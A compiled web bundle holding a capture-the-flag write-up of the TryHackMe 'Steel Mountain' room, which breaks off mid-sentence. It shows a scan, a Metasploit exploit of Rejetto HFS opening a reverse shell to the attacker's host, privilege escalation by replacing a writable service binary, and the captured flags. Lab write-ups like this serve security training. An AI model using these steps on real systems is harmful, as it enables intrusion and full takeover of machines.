"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[2275],{3905:(e,t,n)=>{n.d(t,{Zo:()=>d,kt:()=>h});var i=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);t&&(i=i.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,i)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e,t){if(null==e)return{};var n,i,a=function(e,t){if(null==e)return{};var n,i,a={},r=Object.keys(e);for(i=0;i<r.length;i++)n=r[i],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(i=0;i<r.length;i++)n=r[i],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=i.createContext({}),c=function(e){var t=i.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},d=function(e){var t=c(e.components);return i.createElement(l.Provider,{value:t},e.children)},p="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return i.createElement(i.Fragment,{},t)}},u=i.forwardRef((function(e,t){var n=e.components,a=e.mdxType,r=e.originalType,l=e.parentName,d=o(e,["components","mdxType","originalType","parentName"]),p=c(n),u=a,h=p["".concat(l,".").concat(u)]||p[u]||m[u]||r;return n?i.createElement(h,s(s({ref:t},d),{},{components:n})):i.createElement(h,s({ref:t},d))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var r=n.length,s=new Array(r);s[0]=u;var o={};for(var l in t)hasOwnProperty.call(t,l)&&(o[l]=t[l]);o.originalType=e,o[p]="string"==typeof e?e:a,s[1]=o;for(var c=2;c<r;c++)s[c]=n[c];return i.createElement.apply(null,s)}return i.createElement.apply(null,n)}u.displayName="MDXCreateElement"},20817:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>s,default:()=>m,frontMatter:()=>r,metadata:()=>o,toc:()=>c});var i=n(87462),a=(n(67294),n(3905));const r={},s="Steel Mountain",o={unversionedId:"Tryhackme/Steel Mountain/Steel Mountain",id:"Tryhackme/Steel Mountain/Steel Mountain",title:"Steel Mountain",description:"Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.",source:"@site/writeups/Tryhackme/Steel Mountain/Steel Mountain.md",sourceDirName:"Tryhackme/Steel Mountain",slug:"/Tryhackme/Steel Mountain/",permalink:"/writeups/Tryhackme/Steel Mountain/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Startup",permalink:"/writeups/Tryhackme/Startup/"},next:{title:"StuxCTF",permalink:"/writeups/Tryhackme/StuxCTF/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Introduction",id:"task-1-introduction",level:2},{value:"Task 2 Initial Access",id:"task-2-initial-access",level:2},{value:"Task 3 Privilege Escalation",id:"task-3-privilege-escalation",level:2},{value:"Task 4 Access and Escalation Without Metasploit",id:"task-4-access-and-escalation-without-metasploit",level:2}],d={toc:c},p="wrapper";function m(e){let{components:t,...n}=e;return(0,a.kt)(p,(0,i.Z)({},d,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"steel-mountain"},"Steel Mountain"),(0,a.kt)("p",null,"Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access."),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/steelmountain"},"Steel Mountain")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"CVE-2014-6287 - Rejetto HTTP File Server (HFS) 2.3.x")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-introduction"},"Task 1 Introduction"),(0,a.kt)("p",null,"In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator."),(0,a.kt)("p",null,"If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our Kali Room."),(0,a.kt)("p",null,"Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up."),(0,a.kt)("p",null,"Deploy the machine."),(0,a.kt)("p",null,"Who is the employee of the month?"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<img src="/img/BillHarper.png" style="width:200px;height:200px;" />\n')),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"Bill Harper")),(0,a.kt)("h2",{id:"task-2-initial-access"},"Task 2 Initial Access"),(0,a.kt)("p",null,"Now you have deployed the machine, lets get an initial shell!"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Steel Mountain$ sudo nmap -A -sS -sC -sV -O 10.10.208.51\n[sudo] password for kali:\nStarting Nmap 7.91 ( https://nmap.org ) at 2020-11-18 19:33 CET\nNmap scan report for 10.10.208.51\nHost is up (0.062s latency).\nNot shown: 989 closed ports\nPORT      STATE SERVICE            VERSION\n80/tcp    open  http               Microsoft IIS httpd 8.5\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/8.5\n|_http-title: Site doesn't have a title (text/html).\n135/tcp   open  msrpc              Microsoft Windows RPC\n139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n3389/tcp  open  ssl/ms-wbt-server?\n| ssl-cert: Subject: commonName=steelmountain\n| Not valid before: 2020-10-11T19:04:29\n|_Not valid after:  2021-04-12T19:04:29\n|_ssl-date: 2020-11-18T18:35:02+00:00; +1s from scanner time.\n8080/tcp  open  http               HttpFileServer httpd 2.3\n|_http-server-header: HFS 2.3\n|_http-title: HFS /\n49152/tcp open  msrpc              Microsoft Windows RPC\n49153/tcp open  msrpc              Microsoft Windows RPC\n49154/tcp open  msrpc              Microsoft Windows RPC\n49155/tcp open  msrpc              Microsoft Windows RPC\n49157/tcp open  msrpc              Microsoft Windows RPC\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=11/18%OT=80%CT=1%CU=41940%PV=Y%DS=2%DC=T%G=Y%TM=5FB569\nOS:55%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS\nOS:=7)OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M\nOS:508NW8ST11%O6=M508ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20\nOS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M508NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y\nOS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD\nOS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0\nOS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1\nOS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI\nOS:=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:65:18:20:4c:83 (unknown)\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2020-11-18T18:34:56\n|_  start_date: 2020-11-18T18:17:08\n\nTRACEROUTE (using port 8888/tcp)\nHOP RTT      ADDRESS\n1   39.63 ms 10.8.0.1\n2   39.85 ms 10.10.208.51\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 84.15 seconds\n")),(0,a.kt)("p",null,"Scan the machine with nmap. What is the other port running a web server on?"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"8080")),(0,a.kt)("p",null,"Take a look at the other web server. What file server is running?"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://www.rejetto.com/hfs/"},"https://www.rejetto.com/hfs/")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"Rejetto HTTP File Server")),(0,a.kt)("p",null,"What is the CVE number to exploit this file server?"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/exploits/39161"},"Rejetto HTTP File Server (HFS) 2.3.x")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"2014-6287")),(0,a.kt)("p",null,"Use Metasploit to get an initial shell. What is the user flag?"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Steel Mountain$ msfconsole -q\nmsf5 > search 2014-6287\n\nMatching Modules\n================\n\n   #  Name                                   Disclosure Date  Rank       Check  Description\n   -  ----                                   ---------------  ----       -----  -----------\n   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution\n\n\nmsf5 > use 0\n[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp\nmsf5 exploit(windows/http/rejetto_hfs_exec) > options\n\nModule options (exploit/windows/http/rejetto_hfs_exec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   HTTPDELAY  10               no        Seconds to wait before terminating web server\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT      80               yes       The target port (TCP)\n   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.\n   SRVPORT    8080             yes       The local port to listen on.\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /                yes       The path of the web application\n   URIPATH                     no        The URI to use for this exploit (default is random)\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     192.168.178.57   yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.208.51\nRHOSTS => 10.10.208.51\nmsf5 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080\nRPORT => 8080\nmsf5 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.8.106.222\nLHOST => 10.8.106.222\nmsf5 exploit(windows/http/rejetto_hfs_exec) > set LPORT 9001\nLPORT => 9001\nmsf5 exploit(windows/http/rejetto_hfs_exec) > run\n\n[*] Started reverse TCP handler on 10.8.106.222:9001\n[*] Using URL: http://0.0.0.0:8080/n7csS5eVbQYRq\n[*] Local IP: http://192.168.178.57:8080/n7csS5eVbQYRq\n[*] Server started.\n[*] Sending a malicious request to /\n/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete\n/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete\n[*] Payload request received: /n7csS5eVbQYRq\n[*] Sending stage (176195 bytes) to 10.10.208.51\n[*] Meterpreter session 1 opened (10.8.106.222:9001 -> 10.10.208.51:49259) at 2020-11-18 19:56:15 +0100\n[!] Tried to delete %TEMP%\\qfDBqQnxV.vbs, unknown result\n[*] Server stopped.\n\nmeterpreter > shell\nProcess 2272 created.\nChannel 2 created.\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup>cd C:\\Users\\bill\\Desktop\ncd C:\\Users\\bill\\Desktop\n\nC:\\Users\\bill\\Desktop>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is 2E4A-906A\n\n Directory of C:\\Users\\bill\\Desktop\n\n09/27/2019  08:08 AM    <DIR>          .\n09/27/2019  08:08 AM    <DIR>          ..\n09/27/2019  04:42 AM                70 user.txt\n               1 File(s)             70 bytes\n               2 Dir(s)  44,170,375,168 bytes free\n\nC:\\Users\\bill\\Desktop>type user.txt\ntype user.txt\nb04763b6fcf51fcd7c13abc7db4fd365\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"b04763b6fcf51fcd7c13abc7db4fd365")),(0,a.kt)("h2",{id:"task-3-privilege-escalation"},"Task 3 Privilege Escalation"),(0,a.kt)("p",null,"Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!"),(0,a.kt)("p",null,'To enumerate this machine, we will use a powershell script called PowerUp, that\'s purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."'),(0,a.kt)("p",null,"You can download the script ",(0,a.kt)("a",{parentName:"p",href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"},"here"),". Now you can use the upload command in Metasploit to upload the script."),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/Zqipdba.png",alt:null})),(0,a.kt)("p",null,"To execute this using Meterpreter, I will type ",(0,a.kt)("strong",{parentName:"p"},"load powershell")," into meterpreter. Then I will enter powershell by entering ",(0,a.kt)("strong",{parentName:"p"},"powershell_shell"),":"),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/1IEi13Y.png",alt:null})),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,a.kt)("p",null,"Take close attention to the CanRestart option that is set to true. What is the name of the name of the service which shows up as an unquoted service path vulnerability?"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"PS > .\\PowerUp.ps1\nPS > Invoke-AllCHecks\n\n\nServiceName    : AdvancedSystemCareService9\nPath           : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe\nModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubdirectory}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>\nCanRestart     : True\nName           : AdvancedSystemCareService9\nCheck          : Unquoted Service Paths\n\nServiceName    : AdvancedSystemCareService9\nPath           : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe\nModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>\nCanRestart     : True\nName           : AdvancedSystemCareService9\nCheck          : Unquoted Service Paths\n\nServiceName    : AdvancedSystemCareService9\nPath           : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe\nModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit; IdentityReference=STEELMOUNTAIN\\bill;\n                 Permissions=System.Object[]}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>\nCanRestart     : True\nName           : AdvancedSystemCareService9\nCheck          : Unquoted Service Paths\n\nServiceName    : AdvancedSystemCareService9\nPath           : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe\nModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe;\n                 IdentityReference=STEELMOUNTAIN\\bill; Permissions=System.Object[]}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>\nCanRestart     : True\nName           : AdvancedSystemCareService9\nCheck          : Unquoted Service Paths\n\nServiceName    : AWSLiteAgent\nPath           : C:\\Program Files\\Amazon\\XenTools\\LiteAgent.exe\nModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubdirectory}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>\nCanRestart     : False\nName           : AWSLiteAgent\nCheck          : Unquoted Service Paths\n\nServiceName    : AWSLiteAgent\nPath           : C:\\Program Files\\Amazon\\XenTools\\LiteAgent.exe\nModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>\nCanRestart     : False\nName           : AWSLiteAgent\nCheck          : Unquoted Service Paths\n\nServiceName    : IObitUnSvr\nPath           : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe\nModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubdirectory}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>\nCanRestart     : False\nName           : IObitUnSvr\nCheck          : Unquoted Service Paths\n\nServiceName    : IObitUnSvr\nPath           : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe\nModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>\nCanRestart     : False\nName           : IObitUnSvr\nCheck          : Unquoted Service Paths\n\nServiceName    : IObitUnSvr\nPath           : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe\nModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit; IdentityReference=STEELMOUNTAIN\\bill;\n                 Permissions=System.Object[]}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>\nCanRestart     : False\nName           : IObitUnSvr\nCheck          : Unquoted Service Paths\n\nServiceName    : IObitUnSvr\nPath           : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe\nModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe;\n                 IdentityReference=STEELMOUNTAIN\\bill; Permissions=System.Object[]}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>\nCanRestart     : False\nName           : IObitUnSvr\nCheck          : Unquoted Service Paths\n\nServiceName    : LiveUpdateSvc\nPath           : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe\nModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubdirectory}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>\nCanRestart     : False\nName           : LiveUpdateSvc\nCheck          : Unquoted Service Paths\n\nServiceName    : LiveUpdateSvc\nPath           : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe\nModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>\nCanRestart     : False\nName           : LiveUpdateSvc\nCheck          : Unquoted Service Paths\n\nServiceName    : LiveUpdateSvc\nPath           : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe\nModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe;\n                 IdentityReference=STEELMOUNTAIN\\bill; Permissions=System.Object[]}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>\nCanRestart     : False\nName           : LiveUpdateSvc\nCheck          : Unquoted Service Paths\n\nServiceName                     : AdvancedSystemCareService9\nPath                            : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe\nModifiableFile                  : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe\nModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}\nModifiableFileIdentityReference : STEELMOUNTAIN\\bill\nStartName                       : LocalSystem\nAbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'\nCanRestart                      : True\nName                            : AdvancedSystemCareService9\nCheck                           : Modifiable Service Files\n\nServiceName                     : IObitUnSvr\nPath                            : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe\nModifiableFile                  : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe\nModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}\nModifiableFileIdentityReference : STEELMOUNTAIN\\bill\nStartName                       : LocalSystem\nAbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'\nCanRestart                      : False\nName                            : IObitUnSvr\nCheck                           : Modifiable Service Files\n\nServiceName                     : LiveUpdateSvc\nPath                            : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe\nModifiableFile                  : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe\nModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}\nModifiableFileIdentityReference : STEELMOUNTAIN\\bill\nStartName                       : LocalSystem\nAbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'\nCanRestart                      : False\nName                            : LiveUpdateSvc\nCheck                           : Modifiable Service Files\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"AdvancedSystemCareService9")),(0,a.kt)("p",null,"The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!"),(0,a.kt)("p",null,"Use msfvenom to generate a reverse shell as an Windows executable."),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/ieeJUME.png",alt:null})),(0,a.kt)("p",null,"Upload your binary and replace the legitimate one. Then restart the program to get a shell as root."),(0,a.kt)("p",null,"Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'meterpreter > shell\nProcess 1812 created.\nChannel 14 created.\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup>cd "C:\\Program Files (x86)\\IObit\\"\ncd "C:\\Program Files (x86)\\IObit\\"\n\nC:\\Program Files (x86)\\IObit>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is 2E4A-906A\n\n Directory of C:\\Program Files (x86)\\IObit\n\n11/18/2020  11:30 AM    <DIR>          .\n11/18/2020  11:30 AM    <DIR>          ..\n11/18/2020  11:24 AM    <DIR>          Advanced SystemCare\n11/18/2020  11:29 AM             7,168 Advanced.exe\n09/26/2019  09:35 PM    <DIR>          IObit Uninstaller\n09/26/2019  07:18 AM    <DIR>          LiveUpdate\n               1 File(s)          7,168 bytes\n               5 Dir(s)  44,169,838,592 bytes free\n\nC:\\Program Files (x86)\\IObit>sc qc AdvancedSystemCareService9\nsc qc AdvancedSystemCareService9\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: AdvancedSystemCareService9\n        TYPE               : 110  WIN32_OWN_PROCESS (interactive)\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe\n        LOAD_ORDER_GROUP   : System Reserved\n        TAG                : 1\n        DISPLAY_NAME       : Advanced SystemCare Service 9\n        DEPENDENCIES       :\n        SERVICE_START_NAME : LocalSystem\n\nC:\\Program Files (x86)\\IObit>sc query AdvancedSystemCareService9\nsc query AdvancedSystemCareService9\n\nSERVICE_NAME: AdvancedSystemCareService9\n        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)\n        STATE              : 4  RUNNING\n                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n\nC:\\Program Files (x86)\\IObit>sc stop AdvancedSystemCareService9\nsc stop AdvancedSystemCareService9\n\nSERVICE_NAME: AdvancedSystemCareService9\n        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)\n        STATE              : 4  RUNNING\n                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n\nC:\\Program Files (x86)\\IObit>sc start AdvancedSystemCareService9\nsc start AdvancedSystemCareService9\n[SC] StartService FAILED 1053:\n\nThe service did not respond to the start or control request in a timely fashion.\n\n\nC:\\Program Files (x86)\\IObit>\n')),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,a.kt)("p",null,"What is the root flag?"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Steel Mountain$ nc -lnvp 9002\nListening on 0.0.0.0 9002\nConnection received on 10.10.208.51 49299\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>type "C:\\Users\\Administrator\\Desktop\\root.txt\ntype "C:\\Users\\Administrator\\Desktop\\root.txt\n9af5f314f57607c00fd09803a587db80\n')),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"9af5f314f57607c00fd09803a587db80")),(0,a.kt)("h2",{id:"task-4-access-and-escalation-without-metasploit"},"Task 4 Access and Escalation Without Metasploit"),(0,a.kt)("p",null,"Now let's complete the room without the use of Metasploit."),(0,a.kt)("p",null,"For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to"),(0,a.kt)("p",null,"To begin we shall be using the same CVE. However, this time let's use this ",(0,a.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/exploits/39161"},"exploit"),"."),(0,a.kt)("p",null,(0,a.kt)("em",{parentName:"p"},"Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!")),(0,a.kt)("p",null,"To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from ",(0,a.kt)("a",{parentName:"p",href:"https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe"},"GitHub"),"!"),(0,a.kt)("p",null,"You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,a.kt)("p",null,"Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c."),(0,a.kt)("p",null,"Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running."),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/OyEdJ27.png",alt:null})),(0,a.kt)("p",null,"What powershell -c command could we run to manually find out the service name?"),(0,a.kt)("p",null,(0,a.kt)("em",{parentName:"p"},'Format is "powershell -c "command here"')),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},'powershell -c "Get-Service"')),(0,a.kt)("p",null,"Now let's escalate to Administrator with our new found knowledge."),(0,a.kt)("p",null,"Generate your payload using msfvenom and pull it to the system using powershell."),(0,a.kt)("p",null,"Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands."),(0,a.kt)("p",null,"First we need to stop the service which we can do like 